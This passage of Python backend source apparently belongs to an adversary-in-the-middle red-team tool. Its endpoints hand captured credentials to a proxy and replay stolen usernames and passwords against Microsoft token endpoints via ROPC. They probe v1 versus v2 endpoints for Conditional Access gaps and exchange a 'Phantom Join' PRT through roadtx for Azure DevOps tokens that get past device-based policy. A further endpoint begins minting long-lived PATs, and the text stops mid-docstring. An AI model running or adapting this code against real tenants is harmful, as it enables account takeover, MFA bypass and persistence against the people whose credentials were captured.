                                            "ok": False, "error": str(e)})

            elif cmd == "update_device":
                from backend import devices as _devices
                did = msg.get("device_id", "")
                patch = msg.get("patch") or {}
                try:
                    rec = await _devices.update(did, patch)
                    await ws.send_json({"type": "device_updated",
                                        "device": rec})
                except Exception as e:
                    await ws.send_json({"type": "device_updated",
                                        "ok": False, "error": str(e)})

            elif cmd == "delete_device":
                from backend import devices as _devices
                did = msg.get("device_id", "")
                ok = _devices.delete(did)
                await ws.send_json({"type": "device_deleted",
                                    "device_id": did, "ok": bool(ok)})

            elif cmd == "launch_with_device":
                from urllib.parse import quote
                from backend.shared import append_log
                did = msg.get("device_id", "")
                start_url = msg.get("start_url", "") or ""
                private = bool(msg.get("private", False))
                append_log("info", "devices",
                           f"DEVICE_LAUNCH_REQUEST id={did} "
                           f"start_url={start_url[:200] or '(none)'} "
                           f"private={private}")
                qs = f"auto=1&device_id={quote(did)}"
                if start_url:
                    qs += f"&url={quote(start_url, safe='')}"
                if private:
                    qs += "&private=true"
                # Build a relative URL — the dashboard tab opens it on
                # whatever host the user is already viewing :8092 on, but
                # browser_url is a host-relative path that lands at :8091.
                # Expose `:8091` host explicitly so popups open the
                # frontend instead of /api on :8092.
                host = msg.get("frontend_host") or ""
                if host:
                    browser_url = f"{host.rstrip('/')}/?{qs}"
                else:
                    # Default to same host, port 8091.
                    browser_url = f"/?{qs}"
                await ws.send_json({"type": "device_launch",
                                    "device_id": did,
                                    "browser_url": browser_url,
                                    "qs": qs})

            elif cmd == "test_ollama":
                try:
                    from backend.ollama_hook import test_connection
                    result = await test_connection()
                    await ws.send_json({"type": "ollama_test_result", **result})
                except Exception as e:
                    await ws.send_json({"type": "ollama_test_result",
                                        "ok": False, "error": str(e)})

            elif cmd == "analyze_flow":
                sid = msg.get("session_id", "")
                start_seq = msg.get("start_seq")
                end_seq = msg.get("end_seq")
                seqs = msg.get("seqs")
                preset = str(msg.get("preset", "general") or "general")
                try:
                    from backend.ollama_hook import analyze_flow
                    async def _send_chunk(delta: str):
                        await ws.send_json({"type": "flow_analysis_chunk",
                                            "session_id": sid, "delta": delta})
                    result = await analyze_flow(
                        sid, start_seq=start_seq, end_seq=end_seq,
                        seqs=seqs, preset=preset, on_chunk=_send_chunk)
                    await ws.send_json({"type": "flow_analysis",
                                        "session_id": sid, **result})
                except Exception as e:
                    await ws.send_json({"type": "flow_analysis",
                                        "session_id": sid,
                                        "ok": False, "error": str(e)})

    except (WebSocketDisconnect, Exception):
        pass
    finally:
        push_task.cancel()
        unsubscribe(q)


@app.websocket("/ws/data")
async def ws_data(ws: WebSocket):
    """Data socket — streams logs and captured data events.
    High-volume, read-only from client perspective.
    Sends initial log history then streams live.
    """
    if not verify_ws_key(ws):
        await ws.close(code=4001, reason="Invalid or missing API key")
        return
    await ws.accept()
    q = subscribe()

    # Send log history — configurable so big backlogs don't choke a weak
    # uplink or many-client fan-out. Default 500; bump via config.
    from backend.shared import get_config_value
    history_n = max(0, int(get_config_value("ws_history_lines", 500) or 0))
    if history_n:
        await ws.send_json({"type": "history", "logs": get_logs(history_n)})

    try:
        while True:
            event = await q.get()
            # Forward logs, flow events, and flow updates on the data socket
            if event.get("type") in ("log", "flow", "flow_update"):
                await ws.send_json(event)
    except (WebSocketDisconnect, Exception):
        pass
    finally:
        unsubscribe(q)


# Keep REST endpoints as fallback
@app.get("/api/diag")
async def diag():
    """Lightweight runtime introspection. Curl-friendly so the
    operator can confirm :8092's FastAPI app + event loop are alive
    even when the WS handshake hangs. Returns counts only — no I/O
    against credentials_store / sessions / disk — so it can't hang
    on the same thing that made the dashboard hang."""
    import asyncio
    try:
        loop = asyncio.get_running_loop()
        tasks = [t for t in asyncio.all_tasks(loop) if not t.done()]
        task_summary = []
        for t in tasks[:30]:
            name = t.get_name()
            coro = t.get_coro()
            cname = getattr(coro, "__qualname__", str(coro))
            task_summary.append({"name": name, "coro": cname[:120]})
    except Exception:
        task_summary = []
    try:
        from backend.shared import _subscribers, _log_buffer
        sub_count = len(_subscribers)
        log_buf = len(_log_buffer)
    except Exception:
        sub_count = 0; log_buf = 0
    try:
        from backend.shared import _log_buffer as _lb
        recent = list(_lb)[-50:]
        recent_lines = [
            f"{e.get('ts','?')} [{e.get('level','?')}] "
            f"{e.get('category','?')}: {e.get('message','')}"
            for e in recent
        ]
    except Exception:
        recent_lines = []
    return {
        "ok": True,
        "version": app.version,
        "running_tasks": len(task_summary),
        "task_sample": task_summary,
        "subscribers": sub_count,
        "log_buffer_lines": log_buf,
        "log_tail": recent_lines,
    }


@app.get("/health")
async def health():
    return {"status": "ok"}


# ── Internal endpoints for the Go proxy daemon ──

import os as _os
_INTERNAL_SECRET = _os.environ.get("INTERNAL_SECRET", "dev-internal-secret")


def _check_internal_secret(request):
    sent = request.headers.get("x-internal-secret", "")
    return sent == _INTERNAL_SECRET


@app.post("/_internal/flow")
async def internal_flow(request: Request):
    from fastapi import HTTPException
    if not _check_internal_secret(request):
        raise HTTPException(status_code=403, detail="forbidden")
    entry = await request.json()
    sid = entry.pop("session_id", "")
    entry.pop("type", None)
    entry.pop("seq", None)
    from backend.shared import append_flow as _af
    _af(sid, entry)
    return {"ok": True}


@app.post("/_internal/flow_update")
async def internal_flow_update(request: Request):
    from fastapi import HTTPException
    if not _check_internal_secret(request):
        raise HTTPException(status_code=403, detail="forbidden")
    body = await request.json()
    sid = body.pop("session_id", "")
    req_id = body.pop("req_id", "")
    from backend.shared import update_flow as _uf
    _uf(sid, req_id, body)
    return {"ok": True}


@app.post("/_internal/log")
async def internal_log(request: Request):
    from fastapi import HTTPException
    if not _check_internal_secret(request):
        raise HTTPException(status_code=403, detail="forbidden")
    body = await request.json()
    append_log(
        body.get("level", "info"),
        body.get("category", "go"),
        body.get("message", ""),
        session_id=body.get("session_id", ""),
    )
    return {"ok": True}


@app.get("/_internal/creds")
async def internal_creds(request: Request, host: str = ""):
    from fastapi import HTTPException
    if not _check_internal_secret(request):
        raise HTTPException(status_code=403, detail="forbidden")
    # Mirror auth_proxy.py's matcher
    if not host:
        return {"credentials": []}
    site_id_candidates = [host.replace(":", "_").replace(".", "_")]
    if site_id_candidates[0].startswith("www_"):
        site_id_candidates.append(site_id_candidates[0][4:])
    results = []
    for key in credentials_store.list_keys():
        base_key = key.split("__")[0] if "__" in key else key
        data = None
        if base_key in site_id_candidates:
            data = credentials_store.get(key)
        else:
            domain = base_key.replace("_", ".")
            if host == domain or host.endswith("." + domain):
                data = credentials_store.get(key)
        if data:
            data["_cred_key"] = key
            results.append(data)
    return {"credentials": results}


@app.post("/_internal/captured_header")
async def internal_captured_header(request: Request):
    from fastapi import HTTPException
    if not _check_internal_secret(request):
        raise HTTPException(status_code=403, detail="forbidden")
    body = await request.json()
    # Reuse the existing browser-session storage logic
    from backend.routes.browser import _store_captured_header as _sch
    await _sch(
        body.get("site_id", ""),
        body.get("name", ""),
        body.get("value", ""),
        body.get("source_url", ""),
        "",
    )
    return {"ok": True}


@app.get("/api/rag/burp-extension/download")
async def download_burp_extension():
    """Download burp-extension/RagScanBridge.py — used by the Settings ->
    RAG Scan Stack -> Burp Suite "Download extension" button so the operator
    doesn't need to find the file on disk to load it into Burp's Extender."""
    from fastapi import HTTPException
    from fastapi.responses import Response
    from pathlib import Path
    ext_path = Path(__file__).resolve().parents[1] / "burp-extension" / "RagScanBridge.py"
    if not ext_path.exists():
        raise HTTPException(status_code=404, detail="RagScanBridge.py not found")
    return Response(content=ext_path.read_bytes(),
                     media_type="text/x-python",
                     headers={"Content-Disposition":
                              'attachment; filename="RagScanBridge.py"'})


@app.get("/api/config")
async def api_get_config():
    return get_config()

@app.post("/api/config")
async def api_set_config(body: dict):
    return update_config(body)

@app.get("/api/sessions")
async def api_sessions():
    return get_active_sessions()


@app.post("/api/test-graph")
async def api_test_graph(body: dict):
    """Test a token against MS Graph /me. Body: {token: "...", url?: "..."}

    Enabled by default. Turn off via Configuration → enable_token_testing.
    WARNING: Creates Azure AD sign-in log entries visible to Blue Team SOC.
    """
    from backend.shared import get_config_value as _gcv
    if not _gcv("enable_token_testing", True):
        return {"error": "Token testing disabled (enable_token_testing=false). "
                "This creates Azure AD sign-in log entries. Enable in Configuration."}
    import httpx
    token = body.get("token", "").strip()
    url = body.get("url", "https://graph.microsoft.com/v1.0/me").strip()
    _sid = (body.get("site_id") or "").strip()
    if not token:
        return {"error": "No token provided"}
    try:
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            resp = await client.get(url, headers={"Authorization": f"Bearer {token}"})
            resp_text = resp.text
            try:
                resp_body = resp.json()
            except Exception:
                resp_body = resp_text[:2000]
            _record_test_flow(_sid, "graph", "GET", url,
                              {"Authorization": "Bearer " + token[:24] + "…"}, "",
                              resp.status_code, dict(resp.headers), resp_text)
            return {
                "status_code": resp.status_code,
                "success": 200 <= resp.status_code < 300,
                "url": url,
                "response": resp_body,
            }
    except Exception as e:
        return {"error": str(e), "url": url}


@app.post("/api/test-ropc")
async def api_test_ropc(body: dict):
    """ROPC (Resource Owner Password Credentials, RFC 6749 §4.3) grant —
    POST username + password straight to the tenant's /token endpoint,
    bypassing the interactive authorization endpoint (and any CA policy
    that only evaluates that leg) entirely. Body:
    {username, password, tenant_id?, client_id?, scope?}.
    tenant_id defaults to "organizations", NOT "common"/"consumers" —
    confirmed live: Microsoft rejects the password grant over those two
    outright with AADSTS9001023, before it even looks at the credentials.

    The AADSTS error code on failure is itself the finding, not just
    "it didn't work" — e.g. AADSTS50076 means CA/MFA actually blocked the
    legacy grant (policy working as intended); a 200 with an access_token
    on an account that requires MFA for interactive sign-in means ROPC
    is an uncovered bypass path, the same class of CA-policy gap this
    tool's Path A/Path B features already demonstrate.

    Enabled by default. Turn off via Configuration → enable_token_testing
    (same gate as Test Graph — this also creates Azure AD sign-in log
    entries, distinctly flagged as a legacy/non-interactive grant).
    """
    from backend.shared import get_config_value as _gcv
    if not _gcv("enable_token_testing", True):
        return {"error": "Token testing disabled (enable_token_testing=false). "
                "This creates Azure AD sign-in log entries. Enable in Configuration."}
    username = (body.get("username") or "").strip()
    password = body.get("password") or ""
    if not username or not password:
        return {"error": "username and password required"}
    # NOT "common"/"consumers" — confirmed live against the real endpoint:
    # Microsoft rejects the password grant there outright with
    # AADSTS9001023 ("grant type not supported over /common or /consumers"),
    # before it ever checks the credentials. "organizations" (or a specific
    # tenant GUID/domain) is required for ROPC to actually evaluate the
    # account and CA policy.
    tenant = (body.get("tenant_id") or "organizations").strip()
    # Microsoft Authentication Broker — a well-known public client already
    # used elsewhere in this repo (tools/phantom_join.py), pre-consented
    # for first-party scenarios so ROPC doesn't need its own app registration.
    client_id = (body.get("client_id") or "29d9ed98-a469-4536-ade2-f981bc1d605e").strip()
    scope = (body.get("scope") or "https://graph.microsoft.com/.default openid profile offline_access").strip()
    return await _ropc_grant(username, password, tenant, client_id, scope,
                             site_id=(body.get("site_id") or "").strip(), tool="ropc")


def _test_trace_id(site_id: str, tool: str) -> str:
    """Flow-trace session id for a dashboard test: unique per (credential, tool)
    so each tool's runs accumulate in their own selectable trace."""
    return f"test_{tool}_{site_id}"


def _flow_session_summaries() -> list[dict]:
    """Synthetic dashboard-test traces that have captured flow, for the Flow
    Trace dropdown.

    The dropdown is otherwise built only from *active browser* sessions
    (get_active_sessions), so the synthetic dashboard-test traces
    (`test_<tool>_<site_id>`, produced by ROPC / v1+v2 token / ADO PAT / AAA /
    Graph runs) never appeared as selectable, even though their flow was
    recorded and analyzable. We advertise ONLY those here — active browser
    sessions already reach the dropdown on their own, and ended browser
    sessions persist on disk (for RAG/Burp) but must NOT clutter the live Flow
    Trace list. A trace is "a test" when its id has the `test_` prefix or its
    first entry is `source == "dashboard-test"`. Empty buffers are skipped so a
    zero-row trace never appears. `tool`/`site_id` come off the first entry so
    the client can label the trace without parsing the id."""
    from backend.shared import _session_flows
    out: list[dict] = []
    for sid, buf in list(_session_flows.items()):
        if not buf or not sid:
            continue
        first = buf[0]
        is_test = str(sid).startswith("test_") or \
            first.get("source") == "dashboard-test"
        if not is_test:
            continue
        last = buf[-1]
        out.append({
            "sid": sid,
            "count": len(buf),
            "browser": False,
            "tool": first.get("tool", "") or "",
            "site_id": first.get("site_id", "") or "",
            # Most-recent run's time (re-runs append to the same trace), so the
            # Flow Trace dropdown can show when the test last ran.
            "ts": last.get("ts_resp") or last.get("ts_req") or 0,
        })
    return out


def _record_test_flow(site_id, tool, method, url, req_headers, req_body,
                      status, resp_headers, resp_body):
    """Append a dashboard test (ROPC / v1+v2 token / ADO PAT / device-code /
    AAA / Graph) to a per-(credential, tool) flow trace `test_<tool>_<site_id>`,
    as a full request/response entry. This puts the operator's attack actions on
    the Flow Trace timeline — one trace per tool per credential — so each can be
    analyzed by the local LLM or exported to RAG/Burp. Stores full bodies (incl.
    passwords / tokens / PATs) by design — local-only analysis; encrypted at
    rest when CREDENTIAL_PASSPHRASE is set."""
    if not site_id or not tool:
        return
    try:
        import time as _t
        from backend.shared import append_flow
        now = _t.time()
        append_flow(_test_trace_id(site_id, tool), {
            "req_id": f"test-{int(now * 1000)}",
            "method": method, "url": url, "status": status,
            "request_headers": req_headers or {},
            "request_body": req_body if req_body is not None else "",
            "response_headers": resp_headers or {},
            "response_body": resp_body if resp_body is not None else "",
            "ts_req": now, "ts_resp": now,
            "source": "dashboard-test",
            # Carried on every entry so the dashboard can label the synthetic
            # trace (🧪 <tool> · <site>) and RAG/Burp exports keep the context,
            # even though the (tool, site) is also encoded in the session id.
            "site_id": site_id, "tool": tool,
        })
    except Exception as e:
        append_log("warn", "auth_proxy", f"record_test_flow failed: {e}")


async def _do_token_post(url: str, data: dict, username: str, tenant: str,
                         label: str = "TOKEN", site_id: str = "",
                         tool: str = "") -> dict:
    """Core password-grant POST + response parse, shared by the v2 ROPC path
    (_ropc_grant) and the v1+v2 /api/test-token comparison. Returns the
    structured shape all consumers expect: on success {ok:True, access_token,
    url, ...}; on a blocked grant {ok:False, aadsts_code, url, error,
    error_description} so callers can surface the AADSTS code as the finding.
    `label` prefixes the audit log line (ROPC_SUCCESS / TOKEN_V1_BLOCKED …).
    When `site_id` is set, the full request/response is recorded to that
    credential's `tests_<site_id>` flow trace."""
    import re
    import httpx
    from urllib.parse import urlencode
    req_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    req_body = urlencode(data)
    try:
        async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
            resp = await client.post(url, data=data, headers=req_headers)
            resp_text = resp.text
            try:
                resp_body = resp.json()
            except Exception:
                resp_body = {"raw": resp_text[:2000]}
    except Exception as e:
        _record_test_flow(site_id, tool, "POST", url, req_headers, req_body, 0, {}, f"error: {e}")
        return {"error": str(e), "url": url}

    _record_test_flow(site_id, tool, "POST", url, req_headers, req_body,
                      resp.status_code, dict(resp.headers), resp_text)

    if resp.status_code == 200 and resp_body.get("access_token"):
        append_log("info", "auth_proxy",
                   f"{label}_SUCCESS user={username} tenant={tenant}")
        return {"ok": True, "status_code": resp.status_code, "url": url,
                "access_token": resp_body.get("access_token"),
                "token_type": resp_body.get("token_type"),
                "expires_in": resp_body.get("expires_in"),
                "scope": resp_body.get("scope")}

    err_desc = resp_body.get("error_description", "") or str(resp_body.get("raw", ""))
    m = re.search(r"AADSTS\d+", err_desc)
    append_log("warn", "auth_proxy",
               f"{label}_BLOCKED user={username} tenant={tenant} "
               f"error={resp_body.get('error')} {m.group(0) if m else ''}")
    return {"ok": False, "status_code": resp.status_code, "url": url,
            "error": resp_body.get("error"),
            "error_description": err_desc,
            "aadsts_code": m.group(0) if m else ""}


async def _ropc_grant(username: str, password: str, tenant: str,
                      client_id: str, scope: str, site_id: str = "",
                      tool: str = "ropc") -> dict:
    """v2 ROPC (grant_type=password → /oauth2/v2.0/token) used by
    /api/test-ropc and /api/create-ado-pat."""
    url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
    data = {"grant_type": "password", "client_id": client_id,
            "username": username, "password": password, "scope": scope}
    return await _do_token_post(url, data, username, tenant, label="ROPC",
                                site_id=site_id, tool=tool)


@app.post("/api/test-token")
async def api_test_token(body: dict):
    """Fire the captured creds at BOTH token endpoints via grant_type=password
    and return the two results side by side:
      v1  → https://login.microsoftonline.com/<tenant>/oauth2/token   (resource=)
      v2  → https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token (scope=)
    The v1/v2 split matters because the legacy v1 endpoint is frequently left
    with looser (or no) Conditional Access coverage than v2 — comparing the two
    AADSTS outcomes for the same account shows exactly where that gap is.
    Body: {username, password, tenant_id?, client_id?, resource?, scope?}.
    Same gate as ROPC/Graph (enable_token_testing); both calls create Azure AD
    sign-in log entries (legacy/non-interactive grant — distinctly flagged)."""
    from backend.shared import get_config_value as _gcv
    if not _gcv("enable_token_testing", True):
        return {"error": "Token testing disabled (enable_token_testing=false). "
                "This creates Azure AD sign-in log entries. Enable in Configuration."}
    username = (body.get("username") or "").strip()
    password = body.get("password") or ""
    if not username or not password:
        return {"error": "username and password required"}
    # Same "organizations" default + rationale as /api/test-ropc: common/
    # consumers reject the password grant outright (AADSTS9001023).
    tenant = (body.get("tenant_id") or "organizations").strip()
    client_id = (body.get("client_id") or "29d9ed98-a469-4536-ade2-f981bc1d605e").strip()
    # v1 speaks resource=, v2 speaks scope=.
    resource = (body.get("resource") or "https://graph.microsoft.com").strip()
    scope = (body.get("scope") or "https://graph.microsoft.com/.default openid profile offline_access").strip()
    import asyncio
    _sid = (body.get("site_id") or "").strip()
    base = f"https://login.microsoftonline.com/{tenant}"
    v1_data = {"grant_type": "password", "client_id": client_id,
               "username": username, "password": password, "resource": resource}
    v2_data = {"grant_type": "password", "client_id": client_id,
               "username": username, "password": password, "scope": scope}
    v1, v2 = await asyncio.gather(
        _do_token_post(f"{base}/oauth2/token", v1_data, username, tenant, label="TOKEN_V1", site_id=_sid, tool="token"),
        _do_token_post(f"{base}/oauth2/v2.0/token", v2_data, username, tenant, label="TOKEN_V2", site_id=_sid, tool="token"))
    return {"v1": v1, "v2": v2}


# Azure DevOps first-party resource (app) ID — the audience an AAD token
# must carry to call dev.azure.com / vssps.dev.azure.com APIs.
_ADO_RESOURCE_ID = "499b84ac-1321-427f-aa17-267ca6975798"
# Azure CLI public client — broadly pre-consented and confirmed live to
# mint an ADO-resource token via ROPC for a lab account (the Auth Broker
# client used for Graph ROPC does not carry ADO delegated permission).
_AZ_CLI_CLIENT_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"


@app.post("/api/ado-devicecode/start")
async def api_ado_devicecode_start(body: dict):
    """Begin an OAuth2 device-authorization grant for an Azure DevOps-audience
    token. Returns the user_code + verification_uri to show the operator and
    the device_code to poll with. Unlike ROPC, device code is interactive, so
    it satisfies MFA / Conditional Access — the operator completes sign-in
    (incl. MFA) in a browser, then /api/ado-devicecode/poll picks up the token.
    Uses the Azure CLI public client (pre-consented for the ADO resource)."""
    from backend.shared import get_config_value as _gcv
    if not _gcv("enable_token_testing", True):
        return {"error": "Token testing disabled (enable_token_testing=false). "
                "Enable in Configuration."}
    import httpx
    tenant = (body.get("tenant_id") or "organizations").strip()
    client_id = (body.get("client_id") or _AZ_CLI_CLIENT_ID).strip()
    scope = (body.get("scope") or f"{_ADO_RESOURCE_ID}/.default offline_access").strip()
    url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode"
    try:
        async with httpx.AsyncClient(timeout=20.0, verify=False) as client:
            r = await client.post(url, data={"client_id": client_id, "scope": scope})
            d = r.json()
    except Exception as e:
        return {"error": f"{type(e).__name__}: {e}"}
    if not d.get("device_code"):
        return {"error": d.get("error_description") or d.get("error")
                or "device code request failed"}
    append_log("info", "auth_proxy",
               f"ADO_DEVICECODE_START tenant={tenant} client_id={client_id}")
    return {"ok": True, "device_code": d["device_code"],
            "user_code": d.get("user_code"),
            "verification_uri": d.get("verification_uri") or d.get("verification_url"),
            "expires_in": d.get("expires_in", 900),
            "interval": d.get("interval", 5),
            "tenant_id": tenant, "client_id": client_id}


@app.post("/api/ado-devicecode/poll")
async def api_ado_devicecode_poll(body: dict):
    """Poll the token endpoint once for a pending device-code grant. Returns
    {ok, access_token} on success, {pending: true} while the operator hasn't
    finished (authorization_pending / slow_down), or {error, terminal} on a
    terminal error (expired / declined). The frontend calls this on `interval`."""
    from backend.shared import get_config_value as _gcv
    if not _gcv("enable_token_testing", True):
        return {"error": "Token testing disabled (enable_token_testing=false)."}
    import re as _re
    import httpx
    tenant = (body.get("tenant_id") or "organizations").strip()
    client_id = (body.get("client_id") or _AZ_CLI_CLIENT_ID).strip()
    device_code = (body.get("device_code") or "").strip()
    if not device_code:
        return {"error": "device_code required"}
    _sid = (body.get("site_id") or "").strip()
    _tool = (body.get("tool") or "").strip()
    url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
    from urllib.parse import urlencode as _ue
    data = {"grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "client_id": client_id, "device_code": device_code}
    try:
        async with httpx.AsyncClient(timeout=20.0, verify=False) as client:
            r = await client.post(url, data=data)
            r_text = r.text
            d = r.json()
    except Exception as e:
        return {"error": f"{type(e).__name__}: {e}"}
    if d.get("access_token"):
        append_log("info", "auth_proxy",
                   f"ADO_DEVICECODE_TOKEN tenant={tenant} — device-code grant completed")
        # Record only the *completed* device-code exchange (not every pending
        # poll) into the tool's trace.
        _record_test_flow(_sid, _tool, "POST", url,
                          {"Content-Type": "application/x-www-form-urlencoded"},
                          _ue(data), r.status_code, dict(r.headers), r_text)
        return {"ok": True, "access_token": d["access_token"]}
    err = d.get("error") or ""
    if err in ("authorization_pending", "slow_down"):
        return {"pending": True, "slow_down": err == "slow_down"}
    m = _re.search(r"AADSTS\d+", d.get("error_description", "") or "")
    code = m.group(0) if m else ""
    desc = d.get("error_description") or err or "device code failed"
    # A CA/MFA block here is expected when the tenant governs the Azure DevOps
    # resource with authentication strength or a compliant/joined-device
    # requirement: device-code sign-in is interactive but can't satisfy a
    # phishing-resistant-MFA or managed-device policy, so CA refuses the ADO
    # token. This is the same coverage boundary the demo rides — device-code
    # only walks past CA when the *target* resource (DRS) is uncovered; the ADO
    # resource usually isn't. The Phantom Join chain is the way through: its PRT
    # carries device claims that satisfy device-based CA.
    ca_codes = ("AADSTS50076", "AADSTS50079", "AADSTS50158",
                "AADSTS53003", "AADSTS50131", "AADSTS700082")
    ca_blocked = code in ca_codes
    if ca_blocked:
        desc += ("  —  Azure DevOps is behind Conditional Access that device-code "
                 "sign-in can't satisfy (auth strength / compliant device). Run "
                 "Phantom Join instead: its PRT carries device claims that satisfy "
                 "device-based CA, then paste the ADO-audience token it yields into "
                 "the “Captured token” method above.")
    return {"error": desc, "aadsts_code": code, "terminal": True,
            "ca_blocked": ca_blocked}


async def _ado_token_from_phantom_prt(prt_path: str = "") -> dict:
    """Exchange a Phantom-Join PRT for an Azure DevOps-audience token via
    `roadtx prtauth`. The PRT carries device claims that satisfy device-based
    Conditional Access — the path that works when ROPC / device-code are
    MFA/CA-blocked on the ADO resource. Uses the newest
    $DATA_DIR/phantom/*/*/roadtx.prt unless an explicit path is supplied."""
    import asyncio as _a
    import json as _j
    import re
    import shutil as _sh
    from pathlib import Path as _P
    from backend.paths import data_dir
    if prt_path:
        prt = _P(prt_path)
    else:
        root = data_dir() / "phantom"
        cands = (sorted(root.glob("*/*/roadtx.prt"),
                        key=lambda p: p.stat().st_mtime, reverse=True)
                 if root.exists() else [])
        prt = cands[0] if cands else None
    if not prt or not prt.exists():
        return {"ok": False, "error": ("No phantom PRT found. Run Phantom Join "
                "first (it saves roadtx.prt under $DATA_DIR/phantom/<run>/), or "
                "paste an ADO-audience token via the 'Captured token' method.")}
    rx = _sh.which("roadtx")
    if not rx:
        return {"ok": False, "error": "roadtx not on PATH — install roadtools "
                "(pip install roadtx)."}
    work = prt.parent
    outname = ".roadtools_auth_ado"
    outfile = work / outname
    try:
        if outfile.exists():
            outfile.unlink()
    except OSError:
        pass
    cmd = [rx, "prtauth", "-f", prt.name, "-r", _ADO_RESOURCE_ID,
           "--tokenfile", outname]
    try:
        proc = await _a.create_subprocess_exec(
            *cmd, cwd=str(work),
            stdout=_a.subprocess.PIPE, stderr=_a.subprocess.PIPE)
        out_b, err_b = await _a.wait_for(proc.communicate(), timeout=60)
    except _a.TimeoutError:
        return {"ok": False, "error": "roadtx prtauth timed out (60s)"}
    except Exception as e:
        return {"ok": False, "error": f"roadtx prtauth failed to launch: {e}"}
    combined = (out_b.decode("utf-8", "replace") +
                err_b.decode("utf-8", "replace"))
    if outfile.exists():
        try:
            data = _j.loads(outfile.read_text())
        except Exception:
            data = {}
        tok = data.get("accessToken") or data.get("access_token") or ""
        try:
            outfile.unlink()  # don't leave the raw token on disk
        except OSError:
            pass
        if tok:
            append_log("info", "auth_proxy",
                       f"ADO_PRT_TOKEN via phantom PRT {prt}")
            return {"ok": True, "access_token": tok, "prt": str(prt)}
    m = re.search(r"AADSTS\d+", combined)
    hint = ("  — the PRT still lacks the claim CA wants; enrich it "
            "(`roadtx prtenrich -f roadtx.prt`) and re-run phantom."
            if ("50076" in combined or "53003" in combined) else "")
    return {"ok": False, "aadsts_code": m.group(0) if m else "",
            "error": ("PRT→ADO exchange failed. "
                      + (combined.strip()[-400:] or "no token produced") + hint)}


async def _acquire_ado_token(body: dict) -> dict:
    """Acquire an ADO-audience (499b84ac-…) AAD token from the request body by
    the same methods the ADO PAT flow uses: caller-supplied `access_token`, a
    Phantom PRT exchange (`use_phantom_prt`), or a ROPC username+password grant.
    Returns {"ok":True,"token":..,"token_source":..}, or the failure dict from
    the underlying method (carrying "stage": phantom_prt / ropc) verbatim so the
    UI surfaces the AADSTS code as the finding."""
    _sid = (body.get("site_id") or "").strip()
    token = (body.get("access_token") or "").strip()
    if token:
        return {"ok": True, "token": token, "token_source": "provided"}
    if body.get("use_phantom_prt"):
        prt_res = await _ado_token_from_phantom_prt((body.get("prt_path") or "").strip())
        if not prt_res.get("ok"):
            prt_res["stage"] = "phantom_prt"
            return prt_res
        return {"ok": True, "token": prt_res["access_token"], "token_source": "phantom_prt"}
    username = (body.get("username") or "").strip()
    password = body.get("password") or ""
    if not username or not password:
        return {"ok": False,
                "error": "username and password required (or supply access_token)"}
    tenant = (body.get("tenant_id") or "organizations").strip()
    client_id = (body.get("client_id") or _AZ_CLI_CLIENT_ID).strip()
    ropc = await _ropc_grant(username, password, tenant, client_id,
                             f"{_ADO_RESOURCE_ID}/.default", site_id=_sid, tool="adopat")
    if not ropc.get("ok"):
        # Surface the ROPC failure verbatim (incl. aadsts_code) as the finding.
        ropc["stage"] = "ropc"
        return ropc
    return {"ok": True, "token": ropc.get("access_token") or "", "token_source": "ropc"}


async def _discover_ado_orgs(token: str, token_source: str = "") -> dict:
    """Resolve the Azure DevOps organizations for the account behind an
    ADO-audience token via the vssps profile + accounts APIs. Returns
    {"ok":True,"orgs":[...],"member_id":..} or {"ok":False,"error":..,"stage":..}
    (stage = profile / discovery). An empty `orgs` with ok=True means the
    account has an ADO profile but belongs to no organizations."""
    import httpx
    headers = {"Authorization": f"Bearer {token}"}
    try:
        # 30s (not 15s): the vssps.* hosts intermittently take >15s on the TLS
        # handshake from inside Docker Desktop's NAT — a 15s cap surfaced as a
        # spurious "discovery failed" on an otherwise-good run.
        async with httpx.AsyncClient(timeout=30.0, verify=False) as client:
            pr = await client.get(
                "https://app.vssps.visualstudio.com/_apis/profile/profiles/me?api-version=7.1",
                headers=headers)
            if pr.status_code != 200:
                return {"ok": False,
                        "error": f"ADO profile lookup failed (HTTP {pr.status_code}) — "
                        "the token may lack ADO access, or the account has no ADO profile.",
                        "stage": "profile", "status_code": pr.status_code,
                        "token_source": token_source}
            member_id = pr.json().get("publicAlias") or pr.json().get("id")
            ar = await client.get(
                f"https://app.vssps.visualstudio.com/_apis/accounts?memberId={member_id}&api-version=7.1",
                headers=headers)
            orgs = ([a.get("accountName") for a in ar.json().get("value", [])
                     if a.get("accountName")] if ar.status_code == 200 else [])
    except Exception as e:
        # vssps occasionally throws a bare connect/read error (empty str) —
        # include the exception type so a transient blip is distinguishable.
        append_log("warn", "auth_proxy",
                   f"ADO_DISCOVERY_FAILED {type(e).__name__}: {e}")
        return {"ok": False,
                "error": f"ADO org discovery failed ({type(e).__name__}: {e}) — "
                "often transient, retry; or supply `organization` explicitly.",
                "stage": "discovery", "token_source": token_source}
    return {"ok": True, "orgs": orgs, "member_id": member_id,
            "token_source": token_source}


@app.post("/api/ado-orgs")
async def api_ado_orgs(body: dict):
    """List the Azure DevOps organizations for the account behind a token,
    WITHOUT minting a PAT. Same token-acquisition methods as create-ado-pat
    (provided / Phantom PRT / ROPC). Read-only vssps accounts lookup — but note
    a ROPC/device-code acquisition still creates an Azure AD sign-in log entry;
    a captured/provided token does not."""
    from backend.shared import get_config_value as _gcv
    if not _gcv("enable_token_testing", True):
        return {"ok": False, "error": "Token testing disabled "
                "(enable_token_testing=false). Enable in Configuration."}
    tok_res = await _acquire_ado_token(body)
    if not tok_res.get("ok"):
        return tok_res
    disc = await _discover_ado_orgs(tok_res["token"], tok_res["token_source"])
    if not disc.get("ok"):
        return disc
    append_log("info", "auth_proxy",
               f"ADO_ORGS_LISTED n={len(disc['orgs'])} via {tok_res['token_source']}")
    return {"ok": True, "organizations": disc["orgs"],
            "member_id": disc.get("member_id"),
            "token_source": tok_res["token_source"]}


@app.post("/api/create-ado-pat")
async def api_create_ado_pat(body: dict):
    """Mint a long-lived Azure DevOps Personal Access Token from captured
    creds. Body:
    {username?, password?, tenant_id?, access_token?, client_id?,
     organization?, display_name?, scope?, valid_days?, all_orgs?}.

    Chain (all confirmed live against the real endpoints):
      1. Obtain an AAD token for the ADO resource (499b84ac-…) — either the
